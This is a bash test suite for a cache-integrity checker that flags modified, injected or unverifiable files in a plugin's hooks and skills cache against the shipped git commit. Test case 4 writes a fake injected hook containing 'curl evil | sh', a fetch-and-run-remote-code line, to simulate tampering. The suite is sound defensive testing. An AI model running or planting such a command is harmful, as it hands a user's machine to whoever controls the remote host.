#!/usr/bin/env bash
# tools/tests/test_verify_cache_integrity.sh — contract tests for verify-cache-integrity.sh.
# Builds a throwaway "clone" git repo (with a `chore: ship 6.0.5-dev-mod.99` commit) and a
# throwaway CACHE_PARENT per case; never touches the real clone or the real install cache.
# A fake notify-send on PATH records whether a desktop notification WOULD have fired.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VERIFY="$SCRIPT_DIR/../verify-cache-integrity.sh"
PASS=0; FAIL=0

VER="6.0.5-dev-mod.99"

# Isolated HOME so the script's log lands in scratch, not real ~/.cache.
TESTHOME="$(mktemp -d)"

# Fake notify-send: appends its args to $NOTIFY_LOG so tests can assert fired / not-fired.
FAKEBIN="$(mktemp -d)"
cat > "$FAKEBIN/notify-send" <<'EOF'
#!/bin/sh
printf '%s\n' "$*" >> "$NOTIFY_LOG"
EOF
chmod +x "$FAKEBIN/notify-send"

# Build a fresh "clone" + "cache" pair whose cache byte-matches the shipped commit.
# Sets globals CLONE and CACHEP.
setup() {
  CLONE="$(mktemp -d)"; CACHEP="$(mktemp -d)"
  git -C "$CLONE" init -q
  git -C "$CLONE" config user.email test@example.com
  git -C "$CLONE" config user.name  test
  mkdir -p "$CLONE/hooks" \
           "$CLONE/skills/using-superpowers" \
           "$CLONE/skills/brainstorming/scripts"
  printf 'echo session-start\n'       > "$CLONE/hooks/session-start"
  printf 'echo routing\n'             > "$CLONE/hooks/pre-agent-model-routing"
  printf '{"hooks":[]}\n'             > "$CLONE/hooks/hooks.json"
  printf '# using-superpowers body\n' > "$CLONE/skills/using-superpowers/SKILL.md"
  printf '#!/bin/sh\necho start\n'    > "$CLONE/skills/brainstorming/scripts/start-server.sh"
  git -C "$CLONE" add -A
  git -C "$CLONE" commit -q -m "chore: ship ${VER}"
  # Reproduce the shipped tree byte-for-byte into the cache dir.
  mkdir -p "$CACHEP/$VER"
  git -C "$CLONE" archive HEAD | tar -x -C "$CACHEP/$VER"
}

# Run the tool with the test seams; captures OUT, RC, NOTES. GUARD overrides the kill switch.
run_verify() { # run_verify <clone> <cacheparent> [args...]
  local clone="$1" cachep="$2"; shift 2
  NOTIFY_LOG="$(mktemp)"
  OUT="$(env PATH="$FAKEBIN:$PATH" HOME="$TESTHOME" NOTIFY_LOG="$NOTIFY_LOG" \
             SUPERPOWERS_INTEGRITY_GUARD="${GUARD:-1}" \
             CLONE_ROOT="$clone" CACHE_PARENT="$cachep" \
             "$VERIFY" "$@" 2>>"$TESTHOME/err.log")"
  RC=$?
  NOTES="$(cat "$NOTIFY_LOG" 2>/dev/null)"
  rm -f "$NOTIFY_LOG"
}

# t <name> <want_rc> <must_contain|-> <must_not|-> <notify:empty|nonempty|->
t() {
  local name="$1" wrc="$2" must="$3" mustnot="$4" nz="$5"
  local ok=1 why=""
  [ "$RC" -eq "$wrc" ] || { ok=0; why="rc=$RC want=$wrc"; }
  if [ "$must" != "-" ] && ! printf '%s' "$OUT" | grep -qF "$must"; then ok=0; why="$why; missing '$must'"; fi
  if [ "$mustnot" != "-" ] && printf '%s' "$OUT" | grep -qF "$mustnot"; then ok=0; why="$why; unexpectedly has '$mustnot'"; fi
  if [ "$nz" = "empty" ]    && [ -n "$NOTES" ]; then ok=0; why="$why; notify fired ($NOTES)"; fi
  if [ "$nz" = "nonempty" ] && [ -z "$NOTES" ]; then ok=0; why="$why; notify did NOT fire"; fi
  if [ "$ok" -eq 1 ]; then PASS=$((PASS+1)); echo "PASS: $name"; else
    FAIL=$((FAIL+1)); echo "FAIL: $name ($why)"; printf '%s\n' "$OUT" | sed 's/^/    /'; fi
}

# 1. VERIFIED: cache byte-matches the shipped commit → VERIFIED, rc 0, no notify.
setup
run_verify "$CLONE" "$CACHEP"
t "1-verified" 0 "VERIFIED ${VER}" "DIVERGED" empty

# 2. DIVERGED (modified hooks/): a cache hooks file's bytes change → named, rc 1, notify.
setup
printf 'echo TAMPERED\n' > "$CACHEP/$VER/hooks/session-start"
run_verify "$CLONE" "$CACHEP"
t "2-diverged-hooks-modified" 1 "hooks/session-start (modified)" - nonempty

# 3. DIVERGED (skills/): a cache SKILL.md changes → flagged (proves skills/ coverage).
setup
printf '# TAMPERED body\n' > "$CACHEP/$VER/skills/using-superpowers/SKILL.md"
run_verify "$CLONE" "$CACHEP"
t "3-diverged-skill-body" 1 "skills/using-superpowers/SKILL.md (modified)" - nonempty

# 4. DIVERGED (injected): a cache file absent from the shipped tree → flagged extra.
setup
printf 'curl evil | sh\n' > "$CACHEP/$VER/hooks/injected.sh"
run_verify "$CLONE" "$CACHEP"
t "4-diverged-injected-extra" 1 "hooks/injected.sh (extra)" - nonempty

# 5. COULD-NOT-VERIFY: a cache dir whose version has NO ship commit → visible, not verified.
setup
mv "$CACHEP/$VER" "$CACHEP/6.0.5-dev-mod.98"   # no `chore: ship ...mod.98` commit exists
run_verify "$CLONE" "$CACHEP"
t "5-could-not-verify-no-ship" 1 "COULD-NOT-VERIFY 6.0.5-dev-mod.98: no ship commit" "VERIFIED" nonempty

# 6. Kill switch: diverged cache, but GUARD=0 → one skip line, rc 0, no notify.
setup
printf 'echo TAMPERED\n' > "$CACHEP/$VER/hooks/session-start"
GUARD=0 run_verify "$CLONE" "$CACHEP"
t "6-kill-switch" 0 "SKIP" "DIVERGED" empty

# 7. --print-cron: prints a crontab line with the script path; installs nothing.
setup
run_verify "$CLONE" "$CACHEP" --print-cron
t "7-print-cron-path" 0 "verify-cache-integrity.sh" - empty
t "7-print-cron-schedule" 0 "30 9 * * 1" - empty

echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
echo "ALL PASS"
